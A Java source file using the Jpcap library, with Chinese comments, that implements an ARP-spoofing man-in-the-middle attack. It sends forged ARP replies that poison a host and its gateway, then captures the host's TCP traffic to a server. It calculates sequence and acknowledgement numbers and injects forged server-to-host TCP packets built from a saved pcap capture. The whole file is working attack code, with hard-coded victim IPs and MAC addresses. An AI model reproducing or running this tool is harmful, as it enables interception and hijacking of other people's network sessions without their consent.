package Manager;


import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.TCPPacket;
import Model.Model_Capture;
import Model.Model_a;
import Model.TestPacketReceiver;
import Util.SetPacket.SetARP;
import Util.SetPacket.SetTCP;

public class Manager_cheatServiceAndHost_1 {
	
	static Model_Capture cpmodel = new Model_Capture();
	static List<TCPPacket> cpmodels = new ArrayList<TCPPacket>();
	
	//这3个LIST用来装要发送的包 ARP  TCPtohost  TCPtoservice
	
	static List<ARPPacket> ARPs = new ArrayList<ARPPacket>();
	static List<TCPPacket> TCPtohosts = new ArrayList<TCPPacket>();
	static List<TCPPacket> TCPtoservices = new ArrayList<TCPPacket>();
	
	
	/*static Thread capThread = null;
	static Thread senThread = null;
	static Thread fakeThread = null;*/
		
	public static void main(String[] args) {
		
		//获取发送数据包的网卡
		JpcapSender js = getCrad(0);
		
		/*************************************************
		 * 伪造ARP数据，添加到待发送列表中
		 *************************************************/
		setARPs("192.168.8.100","192.168.8.1");
		
		
		/*************************************************
		 * 启动发包线程，检查发包列表，需要不停的发送
		 *************************************************/
		sentThread(js);
		
		/*************************************************
		 * ARP欺骗成功后，开始捕获主机发送的数据放入到cpmodel中,
		 * 并且计算出伪造数据加入到发送列表
		 *************************************************/
		capPacket_run(0,"192.168.8.100","119.29.42.117");
		
		
		/*************************************************
		 * 选择模式，进入伪造线程，开始伪造数据,并添加到待发送列表
		 * 模式一：只转发数据
		 * 模式二：拦截主机和服务器的数据，并且发送伪造与主机的通信
		 *************************************************/
		//fakeThread(2);
		
	}
	
	
	
	
	/*************************************************
	 * 抓包线程第一个参数是网卡序号，后面是主机IP和服务器IP
	 *************************************************/
	public static void capPacket_run(int i,String host_ip, String service_ip){
	    
	       try{    
	            //获取本机上的网络接口对象数组    
	     final  NetworkInterface[] devices = JpcapCaptor.getDeviceList();    
	            
	        NetworkInterface nc=devices[i];    
	        //创建某个卡口上的抓取对象,设置最大一次性抓包大小为2000byte
	        JpcapCaptor jpcap = JpcapCaptor.openDevice(nc, 2000, true, 20); 
	        jpcap.setFilter("ip and tcp", true);
	        startCapThread(jpcap,host_ip,service_ip);    
	        System.out.println("开始抓取第"+i+"个卡口上的数据");    
  
	        }catch(Exception ef){    
	            ef.printStackTrace();    
	            System.out.println("启动失败:  "+ef);    
	        }      
	   }
	    //将Captor放到独立线程中运行    
	   public static void startCapThread(final JpcapCaptor jpcap,final String host_ip,final String service_ip ){    
	       //JpcapCaptor jp=jpcap;    
	       java.lang.Runnable rnner=new Runnable(){      

			public void run(){    
	               //使用接包处理器循环抓包-1表示无限制的抓取数据包   "192.168.8.101","119.29.42.117"
				
	        	   while(true){
	        		  TestPacketReceiver pr = new TestPacketReceiver(host_ip,"E4:D3:32:E0:7B:82");
	        		  jpcap.loopPacket(1, pr);
	        		  
	        		  //拿到抓取到的，指定的TCPmodel 需要对model中的数据进行分析和计算并且把计算的数据返回出线程
	        		  if(pr.getModel() != null){
	        			  
	        			  //加同步锁??
	        			  if(pr.getModel().getFlag().equals("syn")){
	        				  
	        				  System.out.println("握手帧......更新cpmodel失败");
	        				  continue;
	        			  }
	        			  
	        			  
	        			  //锁住capmodel
	        			  synchronized (cpmodel) {
	        				  
	        				  
	        				  if(cpmodel.getAcknum() == 0){
		        				  
		        				  cpmodel =  pr.getModel();	
		        				  System.out.println("cpmodel初始化");
		        				  
		        				  TCPPacket fakeTCP = null;
		        				  fakeTCP = fakeTCP(cpmodel);
		        				  if(fakeTCP != null){ 
		        					  System.out.println("获取到伪造数据");
									   //锁住用来装TCP的list
									  synchronized (TCPtohosts) {	   
										TCPtohosts.add(fakeTCP);
										cpmodels.add(fakeTCP);
							System.out.println("加入伪造数据发送队列.."); 
							
										
									//唤醒伪造线程
									//cpmodel.notifyAll();
									  }   
								  }
		        				  
		        				  
		        			  }  
		        			  //和之前的不同才添加进去
		        			  else if(cpmodel.getAcknum() != 0 && !cpmodel.issame(pr.getModel())){	  
		        				 

	        					  cpmodel =  pr.getModel();	
	        					  System.out.println("cpmodel更改");
	        					  
	        					  
		        				  TCPPacket fakeTCP = null;
		        				  fakeTCP = fakeTCP(cpmodel);
		        				  if(fakeTCP != null){ 
		        					  System.out.println("获取到伪造数据");
									   //锁住用来装TCP的list
									  synchronized (TCPtohosts) {	   
										TCPtohosts.add(fakeTCP);
										cpmodels.add(fakeTCP);
							System.out.println("加入伪造数据发送队列.."); 
							
							
							
									//唤醒伪造线程
									//cpmodel.notifyAll();
									//System.out.println("打开伪造线程......");
									  }  
								   }
		        				  
		        			  }
	        				  
	        				 /* try {
	        					  //this?
	        					System.out.println("停止抓包线程......");
								cpmodel.wait();
								
							} catch (InterruptedException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}*/
							
						}
						
	        			
	        		  } 
	        	   }    
	           }    
	       }; 
	       

			Thread capThread = new Thread(rnner);
			capThread.start();
	      // new Thread(rnner).start();//启动抓包线程    
	       System.out.println("抓包线程启动");
	   }
	   
	 /*************************************************
	 * end
	 *************************************************/
	   
	   
	   
	   
	 /*************************************************
	 * 发包线程
	 *************************************************/
	   public static void sentThread(final JpcapSender js){
		   
		   java.lang.Runnable runner = new Runnable(){

				@Override
				public void run() {
					
					try {
						
						//不停的发包
						while(true){
							if(js != null){
								//如果LIST不为空，就发送LIST里面的报包
								if(ARPs.size()!= 0){
									
									for(int i= 0 ;i<ARPs.size();i++){	
										js.sendPacket(ARPs.get(i));
										System.out.println("sending arp.."); 
									}	
								}
								
								synchronized (TCPtohosts) {
									if(TCPtohosts.size()!= 0){
										for(int i= 0 ;i<TCPtohosts.size();i++){	
											js.sendPacket(TCPtohosts.get(i));
										System.out.println("sending TCPtohost.."+"seq|"+TCPtohosts.get(i).sequence+" ack|"+TCPtohosts.get(i).ack_num); 
										}	
										
										//发送完毕之后清空，只发送一次
										TCPtohosts.clear();
									}
								}
								
								
								synchronized (TCPtoservices) {
									if(TCPtoservices.size()!= 0){
										for(int i= 0 ;i<TCPtoservices.size();i++){	
											js.sendPacket(TCPtoservices.get(i));
											System.out.println("sending TCPtohost.."+"seq|"+TCPtoservices.get(i).sequence+" ack|"+TCPtoservices.get(i).ack_num);
										}
										TCPtoservices.clear();
									}
									
								}
							}
							//this.wait(10000);
							Thread.sleep(10000);
						}
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				
			};
			
			Thread senThread = new Thread(runner);
			senThread.start();
			
			//new Thread(runner).start();
		   System.out.println("发包线程启动");
		   
	   } 
	 /*************************************************
	 * end
	 *************************************************/
	   
	 /*************************************************
	 * ARPs设置
	 *************************************************/
	   public static void setARPs(String hostIP,String routeIP){
		   SetARP sa = new SetARP();
		   
		  ARPPacket arp1 =  sa.fakeARP(hostIP,routeIP,"AC-CF-23-87-BD-2E","60-D8-19-4A-B2-FC");
		  ARPPacket arp2 =  sa.fakeARP(routeIP,hostIP,"E4-D3-32-E0-7B-82","60-D8-19-4A-B2-FC");
		  
		  ARPs.add(arp1);
		  ARPs.add(arp2); 
	   }
	   
	 /*************************************************
	 * end
	 *************************************************/
	   
	  /*************************************************
	 * 伪造数据包线程,分为多种模式
	 *************************************************/
	  public static void fakeThread(int flag){
		   
		   //模式一为直接转发接收到的数据

		   //模式2为拦截对方数据,转发自己伪造的数据
		    //if(flag == 2){
			   java.lang.Runnable runner = new  Runnable() {
				   public void run() {
					   System.out.println("进入到伪造线程1");
					   
					  while(true){
						  
						  
						  	synchronized (cpmodel) {
							  
							/*  try {
								  System.out.println("伪造线程等待中......");
								cpmodel.wait();
							} catch (InterruptedException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}*/
							
						 // }
						  	
						  	
						  	
						    
						  if(cpmodel != null){
							   //synchronized (cpmodel) {
								 //计算出伪造的数据包,返回一个TCPpcaket
							  System.out.println("开始伪造数据包......");
							  
								   TCPPacket fakeTCP = fakeTCP(cpmodel);
								   System.out.println("访问到cpmodel1");
								   if(fakeTCP != null){ 
									   System.out.println("访问到cpmodel2");
									   //锁住用来装TCP的list
									  // synchronized (TCPtohosts) {	   
										TCPtohosts.add(fakeTCP);
										cpmodels.add(fakeTCP);
							System.out.println("加入伪造数据发送队列.."); 
										//这里只发送一次就Break掉
										//break;
									 // }   
								   }
								
							//}  
						  } 
						  
						  
						  //继续启动抓包
						  //synchronized (cpmodel) {
							  
							 /* try {
								  System.out.println("重新打开抓包线程......");
								cpmodel.notifyAll();;
							} catch (Exception e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}*/
							
						  }
						  
						 
					  
					 }
					
				   }
			   };  
			   
			   Thread fakeThread = new Thread(runner);
			   fakeThread.setPriority(7);
			   fakeThread.start();
			   System.out.println("进入伪造线程......");
			  //  new Thread(runner).setPriority(10).start();
		   //}
		    
	   }
	   /*************************************************
	 * end
	 *************************************************/
	   
	   
	   
	   /*************************************************
	 * 用来伪造计算要发送的TCP帧
	 *************************************************/
	   public static TCPPacket fakeTCP(Model_Capture cpmodel){
		  
		   
		   //先拿到要伪造的数据段
		   Manager_airdump ma = new Manager_airdump();
		   
		   
		   SetTCP st = new SetTCP();
		   TCPPacket tcp = null;
		   
		   //主机发往服务器
		   if(!cpmodel.isTransation()&&cpmodel!=null){
			   
			   //则我门要伪造的数据是伪造为服务器发给主机的
			   //先计算出seq ack
			   
			   long seq = 0;
			   long ack = 0;
			   
			   
			   
			   if(cpmodel.getFlag().equals("syn")){
				   
				   
				   
			   }
			   else if(cpmodel.getFlag().equals("ack")){
				   
				    if(cpmodels.size() == 0){
					   seq = cpmodel.getAcknum();
					   ack = cpmodel.getSeqnum();    
				   }
				  
				   
			   }
			   else if(cpmodel.getFlag().equals("ack/push")){
				   
				   
				   //计算SEQ和ACK
				   seq = cpmodel.getAcknum();
				   ack = cpmodel.getSeqnum() + cpmodel.getDataLen();	  
			 }   
			   
			   if(cpmodels.size() < 3&&seq != 0){
				   
				   int index = cpmodels.size();
				   if(index == 2)
					   index++;
				   
				  Model_a model= ma.run("1122.pcap","192.168.8.100").get(index);
				   
				  tcp =  st.fakePacket(cpmodel.getPort_des(), cpmodel.getPort_sou(), 
		    			 seq, ack, cpmodel.getIp_des(), cpmodel.getIp_sou(),
		    			 "60:d8:19:4a:b2:fc", "AC:CF:23:87:BD:2E", model);
System.out.println("伪造数据成功   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length);  
			   }
			   else if(cpmodels.size() >=3&&seq != 0){
				   
				   tcp =  st.fakePacket(cpmodel.getPort_des(), cpmodel.getPort_sou(), 
			    			 seq, ack, cpmodel.getIp_des(), cpmodel.getIp_sou(),
			    			 "60:d8:19:4a:b2:fc", "AC:CF:23:87:BD:2E", null);
	System.out.println("伪造数据成功   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.len);
				   
			   }
			   //建立为咋数据   
		   }
		   
		  return tcp; 
	   } 
	   
	   /*************************************************
	 * end
	 *************************************************/
	   
	   
	   
	
	   
	   
	   /*************************************************
		 * 发送ARP的线程
		 *************************************************/
		/*public  static void ARPthread(final JpcapSender js){
			
			
			final SentARP sa = new SentARP();
			java.lang.Runnable runner = new Runnable(){

				@Override
				public void run() {
					
					try {
						sa.run_ARP(js,"192.168.8.101","192.168.8.1","AC-CF-23-87-BD-2E","60-D8-19-4A-B2-FC");
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				
			};
			
			new Thread(runner).start();
		}*/
		

		
		/*************************************************
		 * end
		 *************************************************/
		
		 /*************************************************
			 * 获取用来发送数据的网卡
			 *************************************************/
		public static JpcapSender getCrad(int deviceNum){
				  
					NetworkInterface[] devices = null;
					
					 try{    
						 //获取本机上的网络接口对象数组    
						  devices = JpcapCaptor.getDeviceList();
		System.out.println("网卡获取成功  ");  
						 }catch(Exception ef){    
						            ef.printStackTrace();    
			System.out.println("显示网络接口数据失败:  "+ef);    
						    }  
					 
					JpcapSender js = null;
					
					try {
						js = JpcapSender.openDevice(devices[deviceNum]);
		System.out.println("已获取网卡(发送使用)  "+deviceNum+"  JSender建立成功");  				
					} catch (IOException e1) {
			System.out.println("JSender建立不成功");
						e1.printStackTrace();
					}
					  
				  return js;
			  } 
			  /*************************************************
			 * end
			 *************************************************/
}    